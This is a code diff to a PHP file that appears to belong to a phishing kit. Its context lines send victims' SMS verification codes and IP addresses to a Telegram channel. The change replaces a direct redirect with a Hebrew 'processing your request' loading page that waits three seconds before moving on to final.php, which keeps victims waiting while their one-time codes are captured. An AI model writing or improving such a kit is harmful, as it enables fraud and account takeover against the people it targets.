@@ -14,7 +14,54 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   tg_send("📲 <b>SMS Attempt #$attempt</b>\nCode: $smscode\nIP: $ip");
 
   if ($attempt >= 2) {
-    header("Location: final.php");
+    echo '
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>מעבד בקשה...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f5f6fa;
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      color: #222;
+    }
+    .loader-text {
+      font-size: 1.2em;
+      margin-top: 20px;
+    }
+    .dots span {
+      animation: blink 1.5s infinite;
+      font-size: 2em;
+      margin: 0 2px;
+    }
+    .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; }
+      40% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.imgur.com/5LZ8dA5.gif" alt="Loading" width="90" />
+  <div class="loader-text">מעבד את הבקשה שלך<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>
+  <script>
+    setTimeout(function() {
+      window.location.href = "final.php"; // or final.php
+    }, 3000);
+  </script>
+</body>
+</html>';
+exit;
     exit;
   }
 
